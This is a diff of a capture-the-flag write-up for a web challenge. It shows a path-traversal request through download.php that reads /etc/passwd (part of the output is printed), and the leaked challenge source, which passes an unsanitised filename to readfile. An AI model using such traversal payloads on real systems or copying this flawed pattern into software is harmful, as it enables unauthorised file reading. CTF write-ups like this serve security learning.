@@ -3,6 +3,7 @@
 ## Problem
 
 In this year, we stopped using Windows so you can't use DOS tricks!
+
 http://fup.chal.ctf.westerns.tokyo/
 
 Flag 1: TWCTF{then_can_y0u_read_file_list?}
@@ -10,13 +11,14 @@ Flag 1: TWCTF{then_can_y0u_read_file_list?}
 Flag 2: TWCTF{php_is_very_secure}
 
 
-###### Flag 1
+## Flag 1
 
 If you go to the webpage for the challenge you will have a list of files that you can download. 
 
-If you view source you can see that the browser is making a get request to http://fup.chal.ctf.westerns.tokyo/download.php?f= then the name of the file.
+If you view source you can see that the browser is making a GET request to:
+http://fup.chal.ctf.westerns.tokyo/download.php?f= then the name of the file.
 
-The first thing I tryed was local file inclusion because you are giving the nameof the file you want to download in the get request. 
+The first thing I tried was local file inclusion because you are giving the name of the file you want to download in the GET request. 
 
 http://fup.chal.ctf.westerns.tokyo/download.php?f=../../../../../../etc/passwd
 
@@ -57,4 +59,26 @@ unscd:x:112:116::/var/lib/unscd:/bin/false
 twctf:x:1000:1000:Ubuntu:/home/twctf:/bin/bash
 zabbix:x:113:117::/nonexistent:/bin/false
 ```
+
+After that I had to think what is a file that I know is on the system and can help get the flag, download.php is on the system because they call it. 
+
+http://fup.chal.ctf.westerns.tokyo/download.php?f=download.php
+
+It download a file that was empty, so that didn't work so I figured it was looking for download.php in the wrong directory 
+
+http://fup.chal.ctf.westerns.tokyo/download.php?f=../download.php
+
+Worked!!
+
+```
+<?php
+// TWCTF{then_can_y0u_read_file_list?}
+$filename = $_GET['f'];
+if(stripos($filename, 'file_list') != false) die();
+header("Content-Type: application/octet-stream");
+header("Content-Disposition: attachment; filename='$filename'");
+readfile("uploads/$filename");
+```
+
+
 
